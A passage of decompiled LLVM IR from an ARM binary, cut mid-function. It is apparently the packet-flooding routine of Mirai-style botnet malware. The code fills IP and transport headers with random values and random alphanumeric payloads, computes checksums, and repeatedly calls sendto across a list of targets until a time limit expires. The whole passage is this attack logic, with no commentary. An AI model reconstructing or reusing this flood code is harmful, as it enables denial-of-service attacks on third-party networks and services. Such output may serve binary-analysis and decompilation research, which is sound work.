
.thread10:                                        ; preds = %bb79
  %v1_aa10 = load i32, i32* %r4.global-to-local, align 4
  %v2_aa10 = add i32 %v1_aa10, 16
  %v3_aa10 = inttoptr i32 %v2_aa10 to i32*
  %v4_aa10 = load i32, i32* %v3_aa10, align 4
  store i32 %v4_aa10, i32* %r3.global-to-local, align 4
  %v2_aa18 = load i32, i32* @r5, align 4
  %v3_aa18 = add i32 %v2_aa18, 16
  %v4_aa18 = inttoptr i32 %v3_aa18 to i32*
  store i32 %v4_aa10, i32* %v4_aa18, align 4
  br label %bb80

bb80:                                             ; preds = %.thread9, %.thread10
  %v1_aa1c = load i32, i32* @r5, align 4
  %v2_aa1c = add i32 %v1_aa1c, 12
  %v3_aa1c = inttoptr i32 %v2_aa1c to i32*
  store i32 %v0_a9fc, i32* %v3_aa1c, align 4
  %v3_aa20 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa20, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v0_aa28 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa28 = add i32 %v0_aa28, 58
  store i32 %v1_aa28, i32* @r6, align 4
  store i32 %v4_aa2c, i32* %r1.global-to-local, align 4
  %v1_aa30 = add i32 %v3_aa20, 1
  store i32 %v1_aa30, i32* @r4, align 4
  store i32 %v4_aa34, i32* %r2.global-to-local, align 4
  %v9_aa38 = icmp eq i32 %v1_aa30, %arg2
  store i1 %v9_aa38, i1* %cpsr_z.global-to-local, align 1
  %v0_aa3c = load i32, i32* @r8, align 4
  %v1_aa3c = trunc i32 %v0_aa3c to i16
  %v3_aa3c = add i32 %v0_aa28, 62
  %v4_aa3c = inttoptr i32 %v3_aa3c to i16*
  store i16 %v1_aa3c, i16* %v4_aa3c, align 2
  %v0_aa40 = load i32, i32* %r1.global-to-local, align 4
  %v1_aa40 = trunc i32 %v0_aa40 to i16
  %v2_aa40 = load i32, i32* @r6, align 4
  %v3_aa40 = inttoptr i32 %v2_aa40 to i16*
  store i16 %v1_aa40, i16* %v3_aa40, align 2
  %v0_aa44 = load i32, i32* %r2.global-to-local, align 4
  %v1_aa44 = trunc i32 %v0_aa44 to i16
  %v2_aa44 = load i32, i32* @r6, align 4
  %v3_aa44 = add i32 %v2_aa44, 2
  %v4_aa44 = inttoptr i32 %v3_aa44 to i16*
  store i16 %v1_aa44, i16* %v4_aa44, align 2
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %stack_var_-44, align 4
  %v5_aa4c = icmp slt i32 %v1_aa30, %arg2
  br i1 %v5_aa4c, label %dec_label_pc_a8f4, label %dec_label_pc_aa50.preheader

dec_label_pc_aa50.preheader:                      ; preds = %bb80, %dec_label_pc_a814
  %v1_aa6c = add i32 %v5_a764, 8
  %v1_aa70 = add i32 %v5_a764, 66
  %v2_aa7c = icmp eq i32 %v5_a7b8, -1
  %v7_aa7c = icmp eq i32 %v5_a7b8, -1
  %v9_ac74 = icmp eq i32 %v3_a82c, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  %v2_acc4 = icmp eq i32 %v1_a828, 0
  %v2_aad8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_aaf0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_ab00 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ab0c = ptrtoint i32* %stack_var_-54 to i32
  %v2_ab20 = icmp eq i32 %v1_a784, 0
  br label %dec_label_pc_aa50

dec_label_pc_aa50:                                ; preds = %dec_label_pc_aa50.preheader, %dec_label_pc_ad04
  store i1 %v2_a838, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a838, label %dec_label_pc_ad04, label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa50
  store i32 %v5_a764, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_aa6c, i32* @fp, align 4
  store i32 %v1_aa70, i32* @sb, align 4
  br label %dec_label_pc_abd8

dec_label_pc_aa78:                                ; preds = %dec_label_pc_abd8
  store i32 %v5_a7b8, i32* %r1.global-to-local, align 4
  store i1 %v7_aa7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa7c, label %dec_label_pc_ac64, label %dec_label_pc_aa84

dec_label_pc_aa84:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_aa78
  store i32 %v3_a82c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  store i1 %v9_ac74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac74, label %dec_label_pc_ac80, label %dec_label_pc_aa98

dec_label_pc_aa98:                                ; preds = %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge, %dec_label_pc_aa84
  %v1_aa9c = phi i32 [ %v1_aa9c.pre, %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge ], [ ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), %dec_label_pc_aa84 ]
  store i32 %v3_a830, i32* %r3.global-to-local, align 4
  %v9_aa9c = icmp eq i32 %v3_a830, %v1_aa9c
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa9c, label %dec_label_pc_aca8, label %dec_label_pc_aaa4

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_ac80, %dec_label_pc_aa98
  %v1_aaa8 = phi i32 [ %v1_aca0, %dec_label_pc_ac80 ], [ %v1_aa9c, %dec_label_pc_aa98 ]
  store i32 %v3_a834, i32* %ip.global-to-local, align 4
  %v9_aaa8 = icmp eq i32 %v3_a834, %v1_aaa8
  store i1 %v9_aaa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aaa8, label %dec_label_pc_acbc, label %dec_label_pc_aab0

dec_label_pc_aab0:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_aaa4
  store i32 %v1_a828, i32* @lr, align 4
  store i1 %v2_acc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acc4, label %dec_label_pc_acd8, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_aab0
  %v1_aab8 = load i32, i32* @r5, align 4
  %v2_aab8 = add i32 %v1_aab8, 16
  %v3_aab8 = inttoptr i32 %v2_aab8 to i32*
  %v4_aab8 = load i32, i32* %v3_aab8, align 4
  store i32 %v4_aab8, i32* %r3.global-to-local, align 4
  %v2_aabc = load i32, i32* @r6, align 4
  %v3_aabc = add i32 %v2_aabc, 16
  %v4_aabc = inttoptr i32 %v3_aabc to i32*
  store i32 %v4_aab8, i32* %v4_aabc, align 4
  br label %dec_label_pc_aac4

dec_label_pc_aac4:                                ; preds = %bb81, %.thread11, %dec_label_pc_acd8
  %v0_aac4 = call i32 @rand_next()
  store i32 %v0_aac4, i32* %r0.global-to-local, align 4
  store i32 %v0_aac4, i32* %stack_var_-48, align 4
  %v0_aacc = call i32 @rand_next()
  store i32 %v0_aacc, i32* %r0.global-to-local, align 4
  store i32 %v0_aacc, i32* %stack_var_-52, align 4
  %v0_aad4 = call i32 @rand_next()
  store i32 %v2_aad8, i32* %r1.global-to-local, align 4
  store i32 %v0_aad4, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_aae4 = load i32, i32* @r7, align 4
  store i32 %v0_aae4, i32* %r0.global-to-local, align 4
  %v3_aae8 = call i32 @util_memcpy(i32 %v0_aae4, i32 %v2_aad8, i32 4)
  %v0_aaec = load i32, i32* @r7, align 4
  %v1_aaec = add i32 %v0_aaec, 6
  store i32 %v1_aaec, i32* %r0.global-to-local, align 4
  store i32 %v2_aaf0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_aaf8 = call i32 @util_memcpy(i32 %v1_aaec, i32 %v2_aaf0, i32 4)
  %v0_aafc = load i32, i32* @r7, align 4
  %v1_aafc = add i32 %v0_aafc, 4
  store i32 %v1_aafc, i32* %r0.global-to-local, align 4
  store i32 %v2_ab00, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ab08 = call i32 @util_memcpy(i32 %v1_aafc, i32 %v2_ab00, i32 2)
  store i32 %v2_ab0c, i32* %r1.global-to-local, align 4
  %v0_ab10 = load i32, i32* @r7, align 4
  %v1_ab10 = add i32 %v0_ab10, 10
  store i32 %v1_ab10, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ab18 = call i32 @util_memcpy(i32 %v1_ab10, i32 %v2_ab0c, i32 2)
  store i32 %v3_ab18, i32* %r0.global-to-local, align 4
  store i32 %v1_a784, i32* %r1.global-to-local, align 4
  store i1 %v2_ab20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab20, label %dec_label_pc_ab28, label %dec_label_pc_ace4

dec_label_pc_ab28:                                ; preds = %dec_label_pc_aac4, %dec_label_pc_ace4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ab2c = load i32, i32* @r5, align 4
  %v3_ab2c = add i32 %v2_ab2c, 10
  %v4_ab2c = inttoptr i32 %v3_ab2c to i16*
  store i16 0, i16* %v4_ab2c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ab34 = load i32, i32* @r5, align 4
  store i32 %v0_ab34, i32* @r0, align 4
  %v2_ab38 = call i32 @checksum_generic(i32 %v0_ab34, i32 20)
  %v3_ab38 = trunc i32 %v2_ab38 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_ab40 = load i32, i32* @r5, align 4
  %v4_ab40 = add i32 %v3_ab40, 10
  %v5_ab40 = inttoptr i32 %v4_ab40 to i16*
  store i16 %v3_ab38, i16* %v5_ab40, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ab48 = load i32, i32* %ip.global-to-local, align 4
  %v1_ab48 = trunc i32 %v0_ab48 to i16
  %v2_ab48 = load i32, i32* @r6, align 4
  %v3_ab48 = add i32 %v2_ab48, 10
  %v4_ab48 = inttoptr i32 %v3_ab48 to i16*
  store i16 %v1_ab48, i16* %v4_ab48, align 2
  %v0_ab4c = load i32, i32* @r6, align 4
  store i32 %v0_ab4c, i32* @r0, align 4
  %v2_ab50 = call i32 @checksum_generic(i32 %v0_ab4c, i32 20)
  %v3_ab50 = trunc i32 %v2_ab50 to i16
  store i32 %v2_ab50, i32* %r0.global-to-local, align 4
  %v3_ab54 = load i32, i32* @r6, align 4
  %v4_ab54 = add i32 %v3_ab54, 10
  %v5_ab54 = inttoptr i32 %v4_ab54 to i16*
  store i16 %v3_ab50, i16* %v5_ab54, align 2
  %v2_ab5c = load i32, i32* @r8, align 4
  %v3_ab5c = add i32 %v2_ab5c, 6
  %v4_ab5c = inttoptr i32 %v3_ab5c to i16*
  store i16 0, i16* %v4_ab5c, align 2
  %v0_ab60 = load i32, i32* @r8, align 4
  store i32 %v0_ab60, i32* @r1, align 4
  %v1_ab64 = add i32 %v0_ab60, 4
  %v2_ab64 = inttoptr i32 %v1_ab64 to i16*
  %v3_ab64 = load i16, i16* %v2_ab64, align 2
  %v4_ab64 = zext i16 %v3_ab64 to i32
  store i32 %v4_ab64, i32* %r2.global-to-local, align 4
  %v0_ab68 = load i32, i32* @fp, align 4
  store i32 %v0_ab68, i32* %r3.global-to-local, align 4
  %v0_ab6c = load i32, i32* @r6, align 4
  store i32 %v0_ab6c, i32* %r0.global-to-local, align 4
  %v4_ab70 = call i32 @checksum_tcpudp(i32 %v0_ab6c, i32 %v0_ab60, i32 %v4_ab64, i32 %v0_ab68)
  %v5_ab70 = trunc i32 %v4_ab70 to i16
  store i32 %v4_ab70, i32* %r0.global-to-local, align 4
  %v3_ab74 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab74, i32* %r2.global-to-local, align 4
  %v3_ab78 = mul i32 %v3_ab74, 32
  store i32 %v3_ab78, i32* %r3.global-to-local, align 4
  %v0_ab7c = load i32, i32* @r5, align 4
  %v1_ab7c = add i32 %v0_ab7c, 16
  %v2_ab7c = inttoptr i32 %v1_ab7c to i32*
  %v3_ab7c = load i32, i32* %v2_ab7c, align 4
  %v5_ab80 = mul i32 %v3_ab74, 24
  store i32 %v5_ab80, i32* %r3.global-to-local, align 4
  %v1_ab84 = load i32, i32* @sl, align 4
  %v2_ab84 = add i32 %v1_ab84, %v5_ab80
  store i32 %v2_ab84, i32* @lr, align 4
  %v2_ab88 = add i32 %v2_ab84, 4
  %v3_ab88 = inttoptr i32 %v2_ab88 to i32*
  store i32 %v3_ab7c, i32* %v3_ab88, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_ab94 = load i32, i32* @r8, align 4
  %v4_ab94 = add i32 %v3_ab94, 6
  %v5_ab94 = inttoptr i32 %v4_ab94 to i16*
  store i16 %v5_ab70, i16* %v5_ab94, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ab9c = load i32, i32* %r1.global-to-local, align 4
  %v1_ab9c = trunc i32 %v0_ab9c to i16
  %v2_ab9c = load i32, i32* %r3.global-to-local, align 4
  %v3_ab9c = load i32, i32* @sl, align 4
  %v4_ab9c = add i32 %v3_ab9c, %v2_ab9c
  %v5_ab9c = inttoptr i32 %v4_ab9c to i16*
  store i16 %v1_ab9c, i16* %v5_ab9c, align 2
  %v0_aba0 = load i32, i32* %r2.global-to-local, align 4
  %v1_aba0 = trunc i32 %v0_aba0 to i16
  %v2_aba0 = load i32, i32* @lr, align 4
  %v3_aba0 = add i32 %v2_aba0, 2
  %v4_aba0 = inttoptr i32 %v3_aba0 to i16*
  store i16 %v1_aba0, i16* %v4_aba0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_aba8 = load i32, i32* @r5, align 4
  store i32 %v0_aba8, i32* %r1.global-to-local, align 4
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v0_abb0 = load i32, i32* @sb, align 4
  store i32 %v0_abb0, i32* %r2.global-to-local, align 4
  %v0_abb4 = load i32, i32* @lr, align 4
  %v0_abb8 = load i32, i32* %ip.global-to-local, align 4
  %v6_abbc = call i32 @__libc_sendto(i32 %v3_a7dc, i32 %v0_aba8, i32 %v0_abb0, i32 16384, i32 %v0_abb4, i32 %v0_abb8)
  %v3_abc0 = load i32, i32* %stack_var_-44, align 4
  %v1_abc4 = add i32 %v3_abc0, 1
  store i32 %v1_abc4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_abcc = icmp eq i32 %v1_abc4, %arg2
  store i1 %v9_abcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_abc4, i32* %stack_var_-44, align 4
  %v6_abd4 = icmp slt i32 %v1_abc4, %arg2
  br i1 %v6_abd4, label %dec_label_pc_abd8, label %dec_label_pc_ad04

dec_label_pc_abd8:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aa64
  %v1_abec = phi i32 [ %v1_abc4, %dec_label_pc_ab28 ], [ 0, %dec_label_pc_aa64 ]
  %v5_abdc = mul i32 %v1_abec, 24
  %v1_abe0 = load i32, i32* @sl, align 4
  %v2_abe0 = add i32 %v1_abe0, %v5_abdc
  store i32 %v2_abe0, i32* %r3.global-to-local, align 4
  store i32 %v2_a698, i32* %lr.global-to-local, align 4
  %v1_abe8 = add i32 %v2_abe0, 20
  %v2_abe8 = inttoptr i32 %v1_abe8 to i8*
  %v3_abe8 = load i8, i8* %v2_abe8, align 1
  %v4_abe8 = zext i8 %v3_abe8 to i32
  store i32 %v4_abe8, i32* %r2.global-to-local, align 4
  %v4_abec = mul i32 %v1_abec, 4
  %v5_abec = add i32 %v4_abec, %v2_a698
  %v6_abec = inttoptr i32 %v5_abec to i32*
  %v7_abec = load i32, i32* %v6_abec, align 4
  store i32 %v7_abec, i32* @r5, align 4
  %v2_abf0 = icmp ugt i8 %v3_abe8, 30
  %v7_abf0 = icmp eq i8 %v3_abe8, 31
  store i1 %v7_abf0, i1* %cpsr_z.global-to-local, align 1
  %v1_abf4 = add i32 %v7_abec, 24
  store i32 %v1_abf4, i32* @r7, align 4
  %v1_abf8 = add i32 %v7_abec, 38
  store i32 %v1_abf8, i32* @r6, align 4
  %v1_abfc = add i32 %v7_abec, 58
  store i32 %v1_abfc, i32* @r8, align 4
  %v2_ac00 = xor i1 %v7_abf0, true
  %v3_ac00 = and i1 %v2_abf0, %v2_ac00
  br i1 %v3_ac00, label %dec_label_pc_aa78, label %dec_label_pc_ac04

dec_label_pc_ac04:                                ; preds = %dec_label_pc_abd8
  %v1_ac04 = add i32 %v2_abe0, 16
  %v2_ac04 = inttoptr i32 %v1_ac04 to i32*
  %v3_ac04 = load i32, i32* %v2_ac04, align 4
  store i32 %v3_ac04, i32* %r4.global-to-local, align 4
  %v0_ac08 = call i32 @rand_next()
  store i32 %v0_ac08, i32* %r0.global-to-local, align 4
  %v3_ac0c = load i32, i32* %stack_var_-44, align 4
  %v5_ac14 = mul i32 %v3_ac0c, 24
  %v1_ac18 = and i32 %v3_ac04, 16711680
  store i32 %v1_ac18, i32* %ip.global-to-local, align 4
  %v3_ac1c = udiv i32 %v3_ac04, 16777216
  %v4_ac20 = udiv i32 %v1_ac18, 256
  %v5_ac20 = or i32 %v4_ac20, %v3_ac1c
  store i32 %v5_ac20, i32* %r2.global-to-local, align 4
  %v1_ac24 = load i32, i32* @sl, align 4
  %v2_ac24 = add i32 %v1_ac24, %v5_ac14
  store i32 %v2_ac24, i32* %r1.global-to-local, align 4
  %v1_ac28 = and i32 %v3_ac04, 65280
  store i32 %v1_ac28, i32* %r3.global-to-local, align 4
  %v1_ac2c = add i32 %v2_ac24, 20
  %v2_ac2c = inttoptr i32 %v1_ac2c to i8*
  %v3_ac2c = load i8, i8* %v2_ac2c, align 1
  %v4_ac2c = zext i8 %v3_ac2c to i32
  store i32 %v4_ac2c, i32* %ip.global-to-local, align 4
  %v5_ac34 = call i32 @llvm.bswap.i32(i32 %v3_ac04)
  %v7_ac38 = lshr i32 %v0_ac08, %v4_ac2c
  %v8_ac38 = add i32 %v7_ac38, %v5_ac34
  store i32 %v8_ac38, i32* %r2.global-to-local, align 4
  %v1_ac3c = and i32 %v8_ac38, 16711680
  store i32 %v1_ac3c, i32* %r0.global-to-local, align 4
  store i32 %v5_a7b8, i32* %r1.global-to-local, align 4
  %v5_ac54 = call i32 @llvm.bswap.i32(i32 %v8_ac38)
  store i32 %v5_ac54, i32* %r3.global-to-local, align 4
  store i1 %v7_aa7c, i1* %cpsr_z.global-to-local, align 1
  %v1_ac5c = load i32, i32* @r5, align 4
  %v2_ac5c = add i32 %v1_ac5c, 16
  %v3_ac5c = inttoptr i32 %v2_ac5c to i32*
  store i32 %v5_ac54, i32* %v3_ac5c, align 4
  br i1 %v2_aa7c, label %dec_label_pc_ac64, label %dec_label_pc_aa84

dec_label_pc_ac64:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_aa78
  %v0_ac64 = call i32 @rand_next()
  store i32 %v0_ac64, i32* %r0.global-to-local, align 4
  store i32 %v3_a82c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  store i1 %v9_ac74, i1* %cpsr_z.global-to-local, align 1
  %v1_ac78 = load i32, i32* @r5, align 4
  %v2_ac78 = add i32 %v1_ac78, 12
  %v3_ac78 = inttoptr i32 %v2_ac78 to i32*
  store i32 %v0_ac64, i32* %v3_ac78, align 4
  br i1 %v9_ac74, label %dec_label_pc_ac80, label %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge

dec_label_pc_ac64.dec_label_pc_aa98_crit_edge:    ; preds = %dec_label_pc_ac64
  %v1_aa9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_aa98

dec_label_pc_ac80:                                ; preds = %dec_label_pc_ac64, %dec_label_pc_aa84
  %v0_ac80 = call i32 @rand_next()
  %v3_ac88 = urem i32 %v0_ac80, 65536
  store i32 %v3_ac88, i32* %r0.global-to-local, align 4
  %v1_ac90 = sub nsw i32 999, %v3_ac88
  store i32 %v1_ac90, i32* %r3.global-to-local, align 4
  %v1_ac94 = trunc i32 %v0_ac80 to i16
  %v2_ac94 = load i32, i32* @r5, align 4
  %v3_ac94 = add i32 %v2_ac94, 4
  %v4_ac94 = inttoptr i32 %v3_ac94 to i16*
  store i16 %v1_ac94, i16* %v4_ac94, align 2
  %v0_ac98 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac98 = trunc i32 %v0_ac98 to i16
  %v2_ac98 = load i32, i32* @r6, align 4
  %v3_ac98 = add i32 %v2_ac98, 4
  %v4_ac98 = inttoptr i32 %v3_ac98 to i16*
  store i16 %v1_ac98, i16* %v4_ac98, align 2
  store i32 %v3_a830, i32* %r3.global-to-local, align 4
  %v1_aca0 = load i32, i32* @r4, align 4
  %v9_aca0 = icmp eq i32 %v3_a830, %v1_aca0
  store i1 %v9_aca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aca0, label %dec_label_pc_aca8, label %dec_label_pc_aaa4

dec_label_pc_aca8:                                ; preds = %dec_label_pc_ac80, %dec_label_pc_aa98
  %v0_aca8 = call i32 @rand_next()
  %v1_aca8 = trunc i32 %v0_aca8 to i16
  store i32 %v0_aca8, i32* %r0.global-to-local, align 4
  store i32 %v3_a834, i32* %ip.global-to-local, align 4
  %v1_acb0 = load i32, i32* @r4, align 4
  %v9_acb0 = icmp eq i32 %v3_a834, %v1_acb0
  store i1 %v9_acb0, i1* %cpsr_z.global-to-local, align 1
  %v3_acb4 = load i32, i32* @r5, align 4
  %v4_acb4 = add i32 %v3_acb4, 58
  %v5_acb4 = inttoptr i32 %v4_acb4 to i16*
  store i16 %v1_aca8, i16* %v5_acb4, align 2
  br i1 %v9_acb0, label %dec_label_pc_acbc, label %dec_label_pc_aab0

dec_label_pc_acbc:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_aaa4
  %v0_acbc = call i32 @rand_next()
  %v1_acbc = trunc i32 %v0_acbc to i16
  store i32 %v0_acbc, i32* %r0.global-to-local, align 4
  store i32 %v1_a828, i32* @lr, align 4
  store i1 %v2_acc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acc4, label %.thread24, label %bb81

.thread24:                                        ; preds = %dec_label_pc_acbc
  %v3_accc25 = load i32, i32* @r8, align 4
  %v4_accc26 = add i32 %v3_accc25, 2
  %v5_accc27 = inttoptr i32 %v4_accc26 to i16*
  store i16 %v1_acbc, i16* %v5_accc27, align 2
  br label %dec_label_pc_acd8

bb81:                                             ; preds = %dec_label_pc_acbc
  %v1_acc8 = load i32, i32* @r5, align 4
  %v2_acc8 = add i32 %v1_acc8, 16
  %v3_acc8 = inttoptr i32 %v2_acc8 to i32*
  %v4_acc8 = load i32, i32* %v3_acc8, align 4
  store i32 %v4_acc8, i32* %r3.global-to-local, align 4
  %v3_accc = load i32, i32* @r8, align 4
  %v4_accc = add i32 %v3_accc, 2
  %v5_accc = inttoptr i32 %v4_accc to i16*
  store i16 %v1_acbc, i16* %v5_accc, align 2
  %v1_acd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_acd0 = load i32, i32* @r6, align 4
  %v3_acd0 = add i32 %v2_acd0, 16
  %v4_acd0 = inttoptr i32 %v3_acd0 to i32*
  store i32 %v1_acd0, i32* %v4_acd0, align 4
  br label %dec_label_pc_aac4

dec_label_pc_acd8:                                ; preds = %.thread24, %dec_label_pc_aab0
  %v0_acd8 = call i32 @rand_next()
  store i32 %v0_acd8, i32* %r0.global-to-local, align 4
  %v1_acdc = load i32, i32* @r6, align 4
  %v2_acdc = add i32 %v1_acdc, 16
  %v3_acdc = inttoptr i32 %v2_acdc to i32*
  store i32 %v0_acd8, i32* %v3_acdc, align 4
  br label %dec_label_pc_aac4

dec_label_pc_ace4:                                ; preds = %dec_label_pc_aac4
  %v0_ace4 = load i32, i32* @r8, align 4
  %v1_ace4 = add i32 %v0_ace4, 8
  store i32 %v1_ace4, i32* @r4, align 4
  store i32 %v1_ace4, i32* %r0.global-to-local, align 4
  store i32 %v5_a764, i32* %r1.global-to-local, align 4
  %v2_acf0 = call i32 @rand_alphastr(i32 %v1_ace4, i32 %v5_a764)
  store i32 %v2_acf0, i32* %r0.global-to-local, align 4
  store i32 %v5_a764, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_acfc = load i32, i32* @r4, align 4
  %v4_acfc = add i32 %v2_acfc, %v5_a764
  %v5_acfc = inttoptr i32 %v4_acfc to i8*
  store i8 0, i8* %v5_acfc, align 1
  br label %dec_label_pc_ab28

dec_label_pc_ad04:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aa50
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ad08 = call i32 @__GI_time(i32* null)
  store i32 %v2_ad08, i32* %r0.global-to-local, align 4
  store i32 %v2_a7c8, i32* %ip.global-to-local, align 4
  %v9_ad10 = icmp eq i32 %v2_a7c8, %v2_ad08
  store i1 %v9_ad10, i1* %cpsr_z.global-to-local, align 1
  %v6_ad14 = icmp slt i32 %v2_a7c8, %v2_ad08
  br i1 %v6_ad14, label %dec_label_pc_ad18, label %dec_label_pc_aa50

dec_label_pc_ad18:                                ; preds = %dec_label_pc_ad04, %entry, %dec_label_pc_ad24
  %v1_ad20 = phi i32 [ %v3_a7dc, %entry ], [ %v1_ad28, %dec_label_pc_ad24 ], [ %v2_ad08, %dec_label_pc_ad04 ]
  store i32 %v3_a66c, i32* %r4.global-to-local, align 4
  store i32 %v24_a66c, i32* %fp.global-to-local, align 4
  store i32 %v27_a66c, i32* %lr.global-to-local, align 4
  ret i32 %v1_ad20

dec_label_pc_ad24:                                ; preds = %dec_label_pc_a7ec
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v1_ad28 = call i32 @__GI___libc_close(i32 %v3_a7dc)
  store i32 %v1_ad28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad18

; uselistorder directives
  uselistorder i32 %v1_ad28, { 1, 0 }
  uselistorder i16 %v1_acbc, { 1, 0 }
  uselistorder i32 %v0_acbc, { 1, 0 }
  uselistorder i32 %v0_aca8, { 1, 0 }
  uselistorder i32 %v1_aca0, { 1, 0 }
  uselistorder i32 %v3_ac88, { 1, 0 }
  uselistorder i32 %v0_ac80, { 1, 0 }
  uselistorder i32 %v5_ac54, { 1, 0 }
  uselistorder i32 %v3_ac04, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v7_abec, { 2, 1, 0, 3 }
  uselistorder i32 %v1_abc4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_ab74, { 1, 0, 2 }
  uselistorder i32 %v4_ab70, { 1, 0 }
  uselistorder i32 %v2_ab50, { 1, 0 }
  uselistorder i1 %v2_acc4, { 2, 3, 1, 0 }
  uselistorder i1 %v9_ac74, { 2, 3, 1, 0 }
  uselistorder i1 %v7_aa7c, { 2, 1, 0 }
  uselistorder i32 %v0_a9fc, { 1, 0, 2 }
  uselistorder i32 %v0_a914, { 1, 2, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v1_a868, { 2, 0, 1 }
  uselistorder i32 %v3_a860, { 2, 1, 0 }
  uselistorder i1 %v2_a838, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a82c, { 2, 1, 3, 0 }
  uselistorder i32 %v1_a828, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v0_a824, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_a820, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a81c, { 1, 0 }
  uselistorder i1 %v7_a80c, { 1, 0 }
  uselistorder i1 %v7_a7e0, { 1, 0 }
  uselistorder i32 %v3_a7dc, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_a7c8, { 2, 1, 0 }
  uselistorder i32 %v5_a7b8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_a784, { 1, 2, 0 }
  uselistorder i32 %v5_a764, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v7_a730, { 1, 0, 3, 2 }
  uselistorder i32 %v1_a718, { 1, 0 }
  uselistorder i32 %v1_a6f4, { 2, 1, 0 }
  uselistorder i32 %v5_a6ec, { 1, 0 }
  uselistorder i8 %v5_a6d0, { 0, 2, 1 }
  uselistorder i32 %v6_a6b0, { 1, 0 }
  uselistorder i32 %v2_a698, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 19, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
